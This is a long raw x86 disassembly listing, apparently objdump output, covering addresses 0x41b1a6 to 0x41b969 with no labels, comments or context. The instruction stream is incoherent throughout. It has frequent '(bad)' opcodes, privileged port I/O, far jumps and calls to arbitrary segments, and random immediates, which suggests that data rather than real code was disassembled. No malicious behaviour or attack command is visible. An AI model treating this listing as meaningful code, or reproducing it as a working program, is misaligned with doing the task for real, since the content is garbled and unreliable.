  41b1a6:	ins    BYTE PTR es:[edi],dx
  41b1a7:	loope  0x41b228
  41b1a9:	(bad)  
  41b1ad:	out    dx,al
  41b1ae:	loope  0x41b1a3
  41b1b0:	retf   
  41b1b1:	frstor [ecx+0x71b36c2b]
  41b1b7:	mov    dl,0x90
  41b1b9:	adc    bl,ah
  41b1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1bc:	nop
  41b1bd:	pop    ecx
  41b1be:	xor    eax,DWORD PTR [ebx+0xd]
  41b1c1:	test   ah,ch
  41b1c3:	push   cs
  41b1c4:	pushf  
  41b1c5:	and    eax,0x19000106
  41b1ca:	jecxz  0x41b1bd
  41b1cc:	shr    BYTE PTR [ebp+ebx*8-0x335adbd8],cl
  41b1d3:	mov    eax,ds:0x85bc8b30
  41b1d8:	out    0xfb,al
  41b1da:	es mov bl,0x78
  41b1dd:	(bad)  
  41b1de:	fimul  WORD PTR [ebp-0x1c]
  41b1e1:	xchg   edi,eax
  41b1e2:	data16 (bad) 
  41b1e4:	rcr    al,0xf2
  41b1e7:	pop    ecx
  41b1e8:	sbb    al,0x17
  41b1ea:	jecxz  0x41b1b7
  41b1ec:	ret    0x4571
  41b1ef:	inc    edx
  41b1f0:	or     eax,0x14c6aca4
  41b1f5:	dec    ecx
  41b1f6:	cmp    esi,ebx
  41b1f8:	psllq  mm2,QWORD PTR [ecx]
  41b1fb:	call   0xd49853b1
  41b200:	xchg   esi,eax
  41b201:	jp     0x41b1cb
  41b203:	test   BYTE PTR ds:0x3d1f4a3e,ch
  41b209:	add    cl,bl
  41b20b:	jle    0x41b203
  41b20d:	rcr    BYTE PTR [edx+0xf],0x55
  41b211:	pop    es
  41b212:	in     al,0xf2
  41b214:	mov    eax,ss:0x788c62a
  41b21a:	cs sbb al,0xb4
  41b21d:	ins    BYTE PTR es:[edi],dx
  41b21e:	call   0x9ae6:0x2dc19c16
  41b225:	repz pop ss
  41b227:	or     BYTE PTR [ecx+0x64],bh
  41b22a:	mov    bh,0xf1
  41b22c:	jmp    0x41b1c4
  41b22e:	cli    
  41b22f:	loopne 0x41b243
  41b231:	icebp  
  41b232:	nop
  41b233:	cld    
  41b234:	lock sahf 
  41b236:	push   cs
  41b237:	adc    ebx,DWORD PTR ds:0xee210e9d
  41b23d:	repz out dx,al
  41b23f:	or     eax,DWORD PTR ds:0xf6ed992c
  41b245:	pop    esi
  41b246:	ins    DWORD PTR es:[edi],dx
  41b247:	stos   BYTE PTR es:[edi],al
  41b248:	(bad)  
  41b249:	scas   eax,DWORD PTR es:[edi]
  41b24a:	imul   edi,DWORD PTR [esi+0xf],0xffffff80
  41b24e:	ss addr16 cmp al,0xc3
  41b252:	push   esi
  41b253:	out    0xdb,eax
  41b255:	or     edi,edi
  41b257:	xor    al,0xb5
  41b259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b25a:	push   ss
  41b25b:	xor    ebp,DWORD PTR [esi-0x319d4602]
  41b261:	stos   BYTE PTR es:[edi],al
  41b262:	pop    ebp
  41b263:	jle    0x41b2c5
  41b265:	sub    al,ah
  41b267:	push   cs
  41b268:	mov    esp,0x3eedf8da
  41b26d:	jo     0x41b1f4
  41b26f:	xor    bl,BYTE PTR [esi]
  41b271:	or     ch,al
  41b273:	push   esi
  41b274:	mov    bh,0xa4
  41b276:	int3   
  41b277:	push   edi
  41b278:	lahf   
  41b279:	aam    0xa7
  41b27b:	mov    BYTE PTR [ecx+0x26],dh
  41b27e:	and    BYTE PTR [ecx],bl
  41b280:	out    0xfc,eax
  41b282:	sub    eax,0x5247b07e
  41b287:	dec    BYTE PTR ds:0x5fa059af
  41b28d:	adc    al,0x66
  41b28f:	popf   
  41b290:	cmp    DWORD PTR [ebx+0x16],esp
  41b293:	add    al,dl
  41b295:	and    dl,BYTE PTR [ebx]
  41b297:	push   ds
  41b298:	push   cs
  41b299:	test   eax,0x562f2ed7
  41b29e:	imul   ecx,DWORD PTR [ecx-0x5f7acf33],0x205d9584
  41b2a8:	sub    bh,ah
  41b2aa:	push   ebp
  41b2ab:	cmp    ebx,edx
  41b2ad:	lods   al,BYTE PTR ds:[esi]
  41b2ae:	push   eax
  41b2af:	xor    al,0xe8
  41b2b1:	in     eax,dx
  41b2b2:	out    0x6c,al
  41b2b4:	jecxz  0x41b265
  41b2b6:	or     bl,dh
  41b2b8:	mov    bl,0x90
  41b2ba:	dec    ecx
  41b2bb:	push   ecx
  41b2bc:	jmp    0x698308f4
  41b2c1:	pop    ds
  41b2c2:	add    DWORD PTR [esi],0x50
  41b2c5:	and    esi,ecx
  41b2c7:	imul   eax,DWORD PTR [esi+0x4e5e44af],0xdc7c1d95
  41b2d1:	jae    0x41b268
  41b2d3:	mov    al,ah
  41b2d5:	and    dh,BYTE PTR [eax+0x76]
  41b2d8:	mov    ds:0x822cad68,eax
  41b2dd:	sti    
  41b2de:	mov    WORD PTR [ecx],cs
  41b2e0:	sahf   
  41b2e1:	xchg   DWORD PTR [ecx],esp
  41b2e3:	push   0x8620c404
  41b2e8:	dec    edx
  41b2e9:	or     bl,BYTE PTR [ebp+0x17c4980]
  41b2ef:	add    al,0x80
  41b2f1:	or     DWORD PTR [esi+0x1],esi
  41b2f4:	das    
  41b2f5:	call   0xecdf:0xed0931f
  41b2fc:	pop    esp
  41b2fd:	sbb    ecx,DWORD PTR ss:[esi+0x25]
  41b301:	push   es
  41b302:	mov    DWORD PTR [esi-0x22],ebx
  41b305:	into   
  41b306:	rol    DWORD PTR [edi],1
  41b308:	inc    esp
  41b309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b30a:	cmp    cl,ah
  41b30c:	add    ah,BYTE PTR [ecx+0x6c6b66d7]
  41b312:	jp     0x41b35c
  41b314:	loopne 0x41b2a5
  41b316:	jnp    0x41b349
  41b318:	(bad)  
  41b319:	ja     0x41b32e
  41b31b:	pop    ebp
  41b31c:	into   
  41b31d:	jg     0x41b2bf
  41b31f:	rcl    edx,1
  41b321:	dec    edx
  41b322:	dec    eax
  41b323:	sub    BYTE PTR [esi+ecx*1-0x64ed7e4],bh
  41b32a:	clc    
  41b32b:	jp     0x41b2e0
  41b32d:	outs   dx,DWORD PTR ds:[esi]
  41b32e:	mov    ch,bh
  41b330:	test   al,0xe1
  41b332:	mov    DWORD PTR [ebx-0x3d094b92],0x29112f92
  41b33c:	pop    edx
  41b33d:	ja     0x41b37b
  41b33f:	xchg   esi,eax
  41b340:	inc    edx
  41b341:	pop    edi
  41b342:	js     0x41b3a8
  41b344:	mov    gs,WORD PTR [edx-0x1b81eee5]
  41b34a:	dec    ecx
  41b34b:	xor    eax,0xc8e5f439
  41b350:	pop    ebp
  41b351:	(bad)
  41b354:	push   esi
  41b355:	or     esp,esp
  41b357:	dec    edx
  41b358:	test   BYTE PTR [ecx-0x715a3a09],ah
  41b35e:	xlat   BYTE PTR ds:[ebx]
  41b35f:	jmp    0xf1fc6de4
  41b364:	xchg   ebp,eax
  41b365:	or     bh,BYTE PTR [eax]
  41b367:	dec    esp
  41b368:	stos   DWORD PTR es:[edi],eax
  41b369:	pop    ebp
  41b36a:	jp     0x41b357
  41b36c:	mov    ebp,0xe8c0d380
  41b371:	outs   dx,DWORD PTR ds:[esi]
  41b372:	sub    esi,DWORD PTR [ebp+0x78296f86]
  41b378:	(bad)  
  41b379:	cmp    bh,BYTE PTR [ecx]
  41b37b:	loop   0x41b39d
  41b37d:	push   esp
  41b37e:	pop    ds
  41b37f:	enter  0xd448,0x97
  41b383:	jo     0x41b358
  41b385:	rcr    ebx,1
  41b387:	lahf   
  41b388:	repz push 0x56c2b843
  41b38e:	sbb    al,0x7f
  41b390:	shl    ebp,1
  41b392:	or     DWORD PTR [ebp-0x2ca85400],esp
  41b398:	inc    ebx
  41b399:	aas    
  41b39a:	lods   al,BYTE PTR ds:[esi]
  41b39b:	mov    ecx,0x8a5f6905
  41b3a0:	mov    edx,0x63258a25
  41b3a5:	adc    BYTE PTR [ebx-0x53],ah
  41b3a8:	lods   eax,DWORD PTR ds:[esi]
  41b3a9:	or     al,0xe2
  41b3ab:	jge    0x41b377
  41b3ad:	pop    ss
  41b3ae:	mov    eax,0x7095d145
  41b3b3:	mov    ah,0x89
  41b3b5:	add    eax,0xc1c34bdc
  41b3ba:	mov    BYTE PTR [edx+edi*2-0x1d304117],0xd1
  41b3c2:	cs (bad) 
  41b3c4:	pop    ecx
  41b3c5:	mov    esp,0x18846ca6
  41b3ca:	sbb    eax,0xc224e1ce
  41b3cf:	jmp    0xf5c2a777
  41b3d4:	shl    BYTE PTR [edi],cl
  41b3d6:	sbb    edx,DWORD PTR [edi+ecx*1+0x423ebad3]
  41b3dd:	xchg   edx,eax
  41b3de:	test   BYTE PTR [eax+ebp*1+0x6110efde],0x9a
  41b3e6:	ds sub eax,0x9da612fc
  41b3ec:	stc    
  41b3ed:	in     al,dx
  41b3ee:	daa    
  41b3ef:	(bad)  
  41b3f0:	lds    esp,FWORD PTR [eax-0xf]
  41b3f3:	aad    0xa7
  41b3f5:	mov    edx,0x1d2f1530
  41b3fa:	dec    edx
  41b3fb:	addr16 mov dh,0xb6
  41b3fe:	mov    ds:0xe0b64bab,al
  41b403:	cmc    
  41b404:	stc    
  41b405:	dec    edx
  41b406:	adc    bl,dh
  41b408:	xchg   esi,eax
  41b409:	mov    ecx,esp
  41b40b:	mov    ebp,0xe7199b5a
  41b410:	repnz add eax,0x2322e608
  41b416:	push   esp
  41b417:	mov    bh,BYTE PTR [edx+eax*4-0x16120186]
  41b41e:	loop   0x41b3dc
  41b420:	adc    ch,dh
  41b422:	pop    ds
  41b423:	loope  0x41b44d
  41b425:	xor    bh,dl
  41b427:	mov    esp,0x89f2179c
  41b42c:	fcom   QWORD PTR [esi]
  41b42e:	fs test esi,eax
  41b431:	xchg   ecx,eax
  41b432:	push   ecx
  41b433:	cs ss jno 0x41b421
  41b437:	ret    
  41b438:	fucomp st(4)
  41b43a:	sub    eax,0x9b55c82c
  41b43f:	xor    BYTE PTR [ebx+0x3a24c1fb],ch
  41b445:	and    eax,0x28558e5d
  41b44a:	fnstenv ds:0xd7069d02
  41b450:	fild   DWORD PTR [ebx+0x251c34c0]
  41b456:	(bad)  
  41b457:	xchg   edi,eax
  41b458:	in     eax,0x45
  41b45a:	out    0x47,al
  41b45c:	dec    eax
  41b45d:	mov    dh,BYTE PTR [edx+0x51]
  41b460:	in     eax,dx
  41b461:	loopne 0x41b439
  41b463:	cli    
  41b464:	jmp    0xbf66:0xeaab8ccb
  41b46b:	dec    esi
  41b46c:	call   0xab37:0x19b2a33a
  41b473:	ins    BYTE PTR es:[edi],dx
  41b474:	cld    
  41b475:	add    ebx,edi
  41b477:	jmp    0x41b4c1
  41b479:	jnp    0x41b469
  41b47b:	test   eax,0xe2d73115
  41b480:	add    dh,BYTE PTR [ecx+0x3988db84]
  41b486:	je     0x41b485
  41b488:	mov    DWORD PTR [ecx-0x1833f46d],eax
  41b48e:	jne    0x41b503
  41b490:	stos   BYTE PTR es:[edi],al
  41b491:	hlt    
  41b492:	dec    ebp
  41b493:	push   esi
  41b494:	call   0x1c8facee
  41b499:	sub    bh,al
  41b49b:	and    BYTE PTR [ebp+0x6de76eb6],bh
  41b4a1:	arpl   WORD PTR [esi],cx
  41b4a3:	push   0xffffff81
  41b4a5:	xchg   esp,eax
  41b4a6:	shl    DWORD PTR [edi+0x32],cl
  41b4a9:	mov    edi,0x9c02290c
  41b4ae:	jne    0x541d756d
  41b4b4:	mov    esi,0xca926038
  41b4b9:	adc    edx,DWORD PTR [ebp+0x21]
  41b4bc:	mov    bl,0xfb
  41b4be:	push   ecx
  41b4bf:	sar    dl,1
  41b4c1:	dec    eax
  41b4c2:	add    ecx,DWORD PTR [edx-0x5b687876]
  41b4c8:	and    al,0x3e
  41b4ca:	mov    cs,WORD PTR [ebp-0x62]
  41b4cd:	arpl   WORD PTR [edx-0x9],sp
  41b4d0:	push   ecx
  41b4d1:	rcr    bh,1
  41b4d3:	mov    al,ds:0x892302b
  41b4d8:	sbb    eax,0x44bf511b
  41b4dd:	mov    al,0xd8
  41b4df:	fwait
  41b4e0:	pop    ds
  41b4e1:	test   BYTE PTR [edx-0x28],ch
  41b4e4:	mov    ah,bh
  41b4e6:	add    al,0x1a
  41b4e8:	jbe    0x41b4af
  41b4ea:	ss aam 0x4e
  41b4ed:	sub    eax,0x52ef9c07
  41b4f2:	dec    edx
  41b4f3:	mov    edx,0x2b9e3c85
  41b4f8:	dec    ebx
  41b4f9:	test   DWORD PTR [eax+edx*2+0xf],0xd3c631f7
  41b501:	jbe    0xe7552c1a
  41b507:	imul   ebx,DWORD PTR [edi],0xffffffea
  41b50a:	jmp    0x770c0224
  41b50f:	sbb    esi,DWORD PTR [ebx+0x6c]
  41b512:	and    al,BYTE PTR [edi-0x38d03b47]
  41b518:	jbe    0x41b577
  41b51a:	ret    
  41b51b:	jecxz  0x41b4ad
  41b51d:	sbb    al,0xa9
  41b51f:	loop   0x41b4e1
  41b521:	test   DWORD PTR [esi+edx*1],esi
  41b524:	mov    dl,BYTE PTR ds:0xb6d69350
  41b52a:	fidiv  WORD PTR [edi+0x7d]
  41b52d:	xchg   ebx,eax
  41b52e:	sbb    al,0x94
  41b530:	mov    eax,0x565cb57f
  41b535:	push   esi
  41b536:	cld    
  41b537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b538:	in     eax,dx
  41b539:	in     eax,0xa4
  41b53b:	hlt    
  41b53c:	imul   esi,esi,0x74c6cc08
  41b542:	xlat   BYTE PTR ds:[ebx]
  41b543:	add    bh,dh
  41b545:	test   al,0xdd
  41b547:	xchg   edi,eax
  41b548:	sbb    eax,0xd47c67c1
  41b54d:	mov    esp,0xb2f637e5
  41b552:	mov    bl,0x89
  41b554:	ficom  DWORD PTR [ebx+0x3da8a625]
  41b55a:	cmc    
  41b55b:	push   0x77
  41b55d:	repnz shr DWORD PTR [edx+0x729f4ece],1
  41b564:	add    eax,0xa9451007
  41b569:	mov    esi,0x25258046
  41b56e:	jp     0x41b5dd
  41b570:	pop    edx
  41b571:	(bad)  
  41b573:	sub    edx,DWORD PTR [edx+0xe]
  41b576:	adc    ebp,DWORD PTR [eax]
  41b578:	stc    
  41b579:	pop    ebp
  41b57a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b57b:	imul   ecx,DWORD PTR [ecx-0x25129f50],0x21
  41b582:	nop
  41b583:	push   ebp
  41b584:	xchg   DWORD PTR [ebp+0x7d32d423],eax
  41b58a:	ss popa 
  41b58c:	inc    esi
  41b58d:	mov    eax,0xe9eb75c1
  41b592:	adc    edi,0xf0004cc7
  41b598:	sub    ebx,DWORD PTR [eax-0x1ea8a49]
  41b59e:	and    esi,0x43
  41b5a1:	jge    0x41b5d0
  41b5a3:	xchg   esp,eax
  41b5a4:	out    0x2f,eax
  41b5a6:	push   ss
  41b5a7:	retf   0xbb36
  41b5aa:	cs or  eax,0x11d4079d
  41b5b0:	inc    esi
  41b5b1:	out    dx,al
  41b5b2:	rdpmc  
  41b5b4:	adc    cl,BYTE PTR [ecx-0x26733a29]
  41b5ba:	pop    ss
  41b5bb:	jg     0x41b5b8
  41b5bd:	add    ah,BYTE PTR [esp+eiz*8-0x70]
  41b5c1:	push   0x50
  41b5c3:	test   eax,0xf6592f0
  41b5c8:	test   DWORD PTR ds:0x2465791b,ecx
  41b5ce:	dec    edi
  41b5d0:	jmp    0x8ea30a38
  41b5d5:	int    0x86
  41b5d7:	jmp    0x8b1db285
  41b5dc:	xor    ch,BYTE PTR [ebx-0x64]
  41b5df:	neg    DWORD PTR [esi-0x56]
  41b5e2:	xor    eax,0x4ae33d6
  41b5e7:	inc    edi
  41b5e8:	mov    al,ds:0x528d3b2d
  41b5ed:	cld    
  41b5ee:	sbb    BYTE PTR [edx],0x17
  41b5f1:	nop
  41b5f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f3:	pushf  
  41b5f4:	or     ebp,DWORD PTR ds:0x24dfda55
  41b5fa:	add    eax,0xfc6384f4
  41b5ff:	pop    ebx
  41b600:	gs mov esp,0xaced48ec
  41b606:	xor    bh,BYTE PTR [ecx-0x36686a53]
  41b60c:	loop   0x41b681
  41b60e:	push   ebx
  41b60f:	cld    
  41b610:	test   eax,0xc69e9973
  41b615:	jae    0x41b63b
  41b617:	push   eax
  41b618:	fsubr  DWORD PTR [ecx]
  41b61a:	shl    BYTE PTR [ecx-0x15],cl
  41b61d:	pop    edi
  41b61e:	sbb    BYTE PTR [esi-0x80],0x12
  41b622:	fcomi  st,st(5)
  41b624:	es jp  0x41b5f7
  41b627:	lea    esp,[esi]
  41b629:	jg     0x41b687
  41b62b:	imul   eax,ebx,0xffffff96
  41b62e:	sbb    esi,DWORD PTR [esp+ebp*1]
  41b631:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41b633:	js     0x41b61c
  41b635:	sahf   
  41b636:	push   ss
  41b637:	iret   
  41b638:	add    BYTE PTR [ecx],cl
  41b63a:	push   cs
  41b63b:	xor    ah,BYTE PTR ds:0x145020c4
  41b641:	ret    0x206c
  41b644:	jecxz  0x41b62e
  41b646:	cmp    eax,0xbe753a87
  41b64b:	mov    edi,0xc7ce9e04
  41b650:	cld    
  41b651:	mov    edi,ebp
  41b653:	cmp    al,0xed
  41b655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b656:	jne    0x41b6af
  41b658:	in     eax,0x83
  41b65a:	repnz and ah,0x28
  41b65e:	mov    edx,0xe0897abe
  41b663:	lods   eax,DWORD PTR ds:[esi]
  41b664:	retf   0xf32b
  41b667:	clc    
  41b668:	pop    ebp
  41b669:	movaps XMMWORD PTR [edi+0x698d081c],xmm4
  41b670:	cmp    cl,BYTE PTR [ecx]
  41b672:	xchg   bl,dh
  41b674:	sub    al,0xa4
  41b676:	mov    bl,0x7e
  41b678:	cmc    
  41b679:	bound  edi,QWORD PTR [ecx-0x7e]
  41b67c:	push   edx
  41b67d:	je     0x41b651
  41b67f:	cmp    al,0xc1
  41b681:	scas   eax,DWORD PTR es:[edi]
  41b682:	call   0xc97d0ef3
  41b687:	scas   al,BYTE PTR es:[edi]
  41b688:	nop
  41b689:	xor    ah,dl
  41b68b:	lahf   
  41b68c:	(bad)  
  41b68e:	in     al,dx
  41b68f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b690:	sub    eax,0x5866a784
  41b695:	adc    al,BYTE PTR [edx]
  41b697:	into   
  41b698:	popf   
  41b699:	push   eax
  41b69a:	push   ecx
  41b69b:	pop    esi
  41b69c:	(bad)  
  41b69d:	mov    edi,0x3cf6e2d4
  41b6a2:	loop   0x41b650
  41b6a4:	aad    0x70
  41b6a6:	jae    0x41b6bd
  41b6a8:	int3   
  41b6a9:	call   0x20e2:0x4cd213f3
  41b6b0:	stos   BYTE PTR es:[edi],al
  41b6b1:	cmp    eax,0x2eec69e5
  41b6b6:	xchg   esp,eax
  41b6b7:	mov    ds:0x4c8693b1,al
  41b6bc:	pop    edx
  41b6bd:	and    eax,0x8cf67598
  41b6c2:	cmp    dl,bl
  41b6c4:	cmp    DWORD PTR [eax-0xa],ebx
  41b6c7:	xor    al,0x61
  41b6c9:	out    dx,al
  41b6ca:	xlat   BYTE PTR ds:[ebx]
  41b6cb:	adc    eax,ebp
  41b6cd:	dec    edi
  41b6ce:	es jmp 0x4ab7c056
  41b6d4:	repz cmp dh,dl
  41b6d7:	dec    ebx
  41b6d8:	out    dx,al
  41b6d9:	xor    cl,dl
  41b6db:	leave  
  41b6dc:	fsub   QWORD PTR [esi-0xd79901a]
  41b6e2:	stc    
  41b6e3:	mov    edi,0xbdf97211
  41b6e8:	(bad)  
  41b6e9:	cwde   
  41b6ea:	add    DWORD PTR [edx-0x4],0x6f8aa797
  41b6f1:	idiv   BYTE PTR [edi]
  41b6f3:	sbb    DWORD PTR [edi-0x10],ecx
  41b6f6:	neg    DWORD PTR [ebp-0x38]
  41b6f9:	retf   
  41b6fa:	adc    bh,ah
  41b6fc:	dec    ebx
  41b6fd:	cmc    
  41b6fe:	loope  0x41b769
  41b700:	stos   DWORD PTR es:[edi],eax
  41b701:	js     0x41b74d
  41b703:	aam    0xd
  41b705:	xor    al,0xcc
  41b707:	div    esi
  41b709:	xlat   BYTE PTR ds:[ebx]
  41b70a:	jmp    0x27e2:0xebaa3ac8
  41b711:	pop    esp
  41b712:	aad    0xca
  41b714:	stc    
  41b715:	rcr    edx,1
  41b717:	stos   DWORD PTR es:[edi],eax
  41b718:	xchg   edx,eax
  41b719:	jp     0x41b6cc
  41b71b:	js     0x41b714
  41b71d:	ret    0xb43b
  41b720:	dec    ecx
  41b721:	mov    ch,0x4c
  41b723:	in     al,0x60
  41b725:	ror    BYTE PTR [esi],1
  41b727:	jmp    0x41b769
  41b729:	cmp    DWORD PTR [ebp+0x2b],edx
  41b72c:	mov    ebx,0x102833a7
  41b731:	clc    
  41b732:	or     esp,edi
  41b734:	mov    cl,0x61
  41b736:	ss pusha 
  41b738:	dec    esi
  41b739:	mov    edi,0xbb5cf3de
  41b73e:	fs lahf 
  41b740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b741:	adc    dl,BYTE PTR [ecx+eax*4]
  41b744:	imul   edi,DWORD PTR [edx+0x5a43bdb0],0x69
  41b74b:	mov    ebx,0xb227c0e6
  41b750:	sub    DWORD PTR [eax+0x43341a9b],ebx
  41b756:	fst    st(1)
  41b758:	loopne 0x41b7d9
  41b75a:	int    0x60
  41b75c:	xchg   ebp,eax
  41b75d:	and    ebx,DWORD PTR [eax]
  41b75f:	pop    ebx
  41b760:	jle    0x41b775
  41b762:	dec    ebx
  41b763:	fcmovb st,st(2)
  41b765:	mov    ?,WORD PTR [ebx+0x45f7f2d4]
  41b76b:	adc    al,0x8f
  41b76d:	pop    eax
  41b76e:	aaa    
  41b76f:	popf   
  41b770:	xlat   BYTE PTR ds:[ebx]
  41b771:	mov    ch,ch
  41b773:	mov    edx,0x811f7497
  41b778:	adc    esi,DWORD PTR [edx]
  41b77a:	adc    al,0xf3
  41b77c:	loope  0x41b788
  41b77e:	jl     0x41b79d
  41b780:	retf   0xfb2
  41b783:	es push 0xffffffb4
  41b786:	iret   
  41b787:	jns    0x41b734
  41b789:	dec    edx
  41b78a:	loope  0x41b729
  41b78c:	das    
  41b78d:	shr    dh,cl
  41b78f:	lds    eax,FWORD PTR [edi+0x54]
  41b792:	test   BYTE PTR [bx+0x7c],0x28
  41b797:	and    al,0x5e
  41b799:	adc    eax,0xce83b73d
  41b79e:	fldenv [esi]
  41b7a0:	lock das 
  41b7a2:	outs   dx,DWORD PTR ds:[esi]
  41b7a3:	in     al,dx
  41b7a4:	addr16 popf 
  41b7a6:	sbb    bl,BYTE PTR [ebp+0x6f25a4f7]
  41b7ac:	or     ebx,edx
  41b7ae:	in     eax,0xe7
  41b7b0:	mov    BYTE PTR [ebp+0x270c530],dh
  41b7b6:	out    0xd4,eax
  41b7b8:	sub    edx,DWORD PTR ds:0xf5ed388f
  41b7be:	cli    
  41b7bf:	xor    DWORD PTR [ecx+eax*8],esi
  41b7c2:	lds    ebp,FWORD PTR [ebx]
  41b7c4:	push   ebp
  41b7c5:	sti    
  41b7c6:	(bad)  
  41b7c7:	jne    0x41b7f9
  41b7c9:	dec    esp
  41b7ca:	call   DWORD PTR [ecx+eiz*1]
  41b7cd:	cmp    al,0x81
  41b7cf:	popf   
  41b7d0:	in     eax,dx
  41b7d1:	jb     0x41b7af
  41b7d3:	mov    eax,ds:0xc67ada2b
  41b7d8:	shl    BYTE PTR [esi-0x24],0x76
  41b7dc:	out    0xbd,eax
  41b7de:	outs   dx,BYTE PTR ds:[esi]
  41b7df:	jge    0x41b76f
  41b7e1:	push   esp
  41b7e2:	jmp    0x41b7ad
  41b7e4:	add    edi,DWORD PTR [esi-0xf79ea0a]
  41b7ea:	test   BYTE PTR [ebx],ch
  41b7ec:	(bad)  
  41b7ed:	cld    
  41b7ee:	sahf   
  41b7ef:	jp     0x41b795
  41b7f1:	in     eax,dx
  41b7f2:	mov    ebx,ebx
  41b7f4:	inc    edx
  41b7f5:	enter  0x39ae,0xc4
  41b7f9:	stos   BYTE PTR es:[edi],al
  41b7fa:	sbb    cl,BYTE PTR [esi-0x2c]
  41b7fd:	xchg   esi,eax
  41b7fe:	jo     0x41b7ca
  41b800:	dec    eax
  41b801:	div    DWORD PTR [eax+0x71]
  41b804:	lods   al,BYTE PTR ds:[esi]
  41b805:	nop
  41b806:	mov    edi,0x4c404c00
  41b80b:	(bad)  
  41b80c:	jmp    0xeae6c8c3
  41b811:	js     0x41b864
  41b813:	and    esp,DWORD PTR [edx]
  41b815:	mov    eax,ds:0xfe57d371
  41b81a:	(bad)
  41b81d:	stc    
  41b81e:	enter  0x8400,0x93
  41b822:	xlat   BYTE PTR ds:[ebx]
  41b823:	or     ebx,DWORD PTR [eax+0x67f27e3e]
  41b829:	ffreep st(6)
  41b82b:	jmp    DWORD PTR [edi]
  41b82d:	xor    eax,0xdf4ffcdf
  41b832:	mov    cl,0x7a
  41b834:	xor    DWORD PTR [edx+edx*4],ecx
  41b837:	xchg   esp,eax
  41b838:	outs   dx,DWORD PTR ds:[esi]
  41b839:	pop    ds
  41b83a:	pushf  
  41b83b:	mov    cl,0xe7
  41b83d:	lds    ebp,FWORD PTR [esi]
  41b83f:	pop    es
  41b840:	add    eax,0x5fe6400f
  41b845:	mov    bl,0xb4
  41b847:	mov    ebx,0xaed24a3
  41b84c:	retf   
  41b84d:	adc    dh,BYTE PTR [edi+0x35677bf5]
  41b853:	cwde   
  41b854:	dec    ebx
  41b855:	sub    dh,dl
  41b857:	jnp    0x41b8b1
  41b859:	in     eax,0xce
  41b85b:	outs   dx,DWORD PTR ds:[esi]
  41b85c:	sub    al,0x1c
  41b85e:	je     0x41b83d
  41b860:	out    dx,al
  41b861:	mov    edx,0x2380e1e9
  41b866:	rcr    DWORD PTR [edx],cl
  41b868:	sub    BYTE PTR [eax-0x3f4edd67],cl
  41b86e:	out    0x0,eax
  41b870:	pop    esp
  41b871:	ins    DWORD PTR es:[edi],dx
  41b872:	or     DWORD PTR [ebp-0x23b09741],0xc225d22d
  41b87c:	push   0x70
  41b87e:	hlt    
  41b87f:	push   ebp
  41b880:	or     cl,BYTE PTR [esi-0x4d41e449]
  41b886:	(bad)  
  41b887:	aad    0xfc
  41b889:	cs xchg edx,eax
  41b88b:	scas   al,BYTE PTR es:[edi]
  41b88c:	hlt    
  41b88d:	xor    eax,0x8f665892
  41b892:	imul   ebp,DWORD PTR ds:0xe0d7bb2d,0x442671e0
  41b89c:	adc    BYTE PTR [ecx],bl
  41b89e:	add    DWORD PTR [edx],esp
  41b8a0:	push   ss
  41b8a1:	fs je  0x41b856
  41b8a4:	cli    
  41b8a5:	mov    ds:0x89205c0f,al
  41b8aa:	push   ss
  41b8ab:	or     al,BYTE PTR [esi+esi*8-0x3c32b2dd]
  41b8b2:	rcr    BYTE PTR [eax+0x2e],cl
  41b8b5:	into   
  41b8b6:	pop    ss
  41b8b7:	mov    ah,0x5f
  41b8b9:	sbb    esi,esp
  41b8bb:	js     0x41b8e2
  41b8bd:	retf   0x95
  41b8c0:	or     eax,0x242d5778
  41b8c5:	sub    ebp,DWORD PTR [edi+edi*8+0x77161373]
  41b8cc:	adc    bh,dl
  41b8ce:	stos   BYTE PTR es:[edi],al
  41b8cf:	leave  
  41b8d0:	or     al,0xed
  41b8d2:	xchg   BYTE PTR [edi+0x43],ah
  41b8d5:	scas   al,BYTE PTR es:[edi]
  41b8d6:	sbb    DWORD PTR [ecx+ebx*4+0x66],ecx
  41b8da:	dec    esp
  41b8db:	clc    
  41b8dc:	lock pop esp
  41b8de:	xor    esp,ebx
  41b8e0:	ret    0x63af
  41b8e3:	mov    al,0xd7
  41b8e5:	lea    eax,[ecx-0x53]
  41b8e8:	or     DWORD PTR [edx+0x5d349980],esi
  41b8ee:	les    ebx,FWORD PTR [edi+0x14]
  41b8f1:	inc    bp
  41b8f3:	xchg   ebp,eax
  41b8f4:	mov    ds:0x52200212,eax
  41b8f9:	in     al,0xa5
  41b8fb:	lock ret 0x72d3
  41b8ff:	xor    al,0x9e
  41b901:	(bad)  
  41b903:	jo     0x41b88e
  41b905:	(bad)  
  41b907:	cmp    cl,al
  41b909:	dec    ecx
  41b90a:	cs pop ds
  41b90c:	test   esp,0xe6e53a8
  41b912:	add    eax,0xa43f1c84
  41b917:	pcmpgtw mm0,QWORD PTR ds:0x95752bb6
  41b91e:	mov    ch,0xde
  41b920:	xor    BYTE PTR [ebx+ecx*2-0x606e6159],ch
  41b927:	jne    0x41b8f5
  41b929:	dec    edx
  41b92a:	sti    
  41b92b:	out    0x5b,eax
  41b92d:	push   edx
  41b92e:	mov    BYTE PTR [ebx],0x6d
  41b931:	dec    eax
  41b932:	ss mov eax,0x349105ad
  41b938:	fcmovnbe st,st(6)
  41b93a:	fisttp QWORD PTR [eax]
  41b93c:	mov    edx,0xe4b5ce1
  41b941:	adc    BYTE PTR [ecx],ah
  41b943:	test   DWORD PTR [edi+0x38715584],0x30a80607
  41b94d:	or     edx,ebx
  41b94f:	xchg   ebp,eax
  41b950:	jmp    0x6522:0xd036b6
  41b957:	inc    eax
  41b958:	pusha  
  41b959:	xor    esi,ecx
  41b95b:	pusha  
  41b95c:	hlt    
  41b95d:	das    
  41b95e:	xchg   ecx,eax
  41b95f:	stos   BYTE PTR es:[edi],al
  41b960:	pop    esi
  41b961:	ret    0xefb7
  41b964:	xor    eax,0x31e27c5c
  41b969:	rcr    DWORD PTR [ecx+ebx*2-0x41],cl
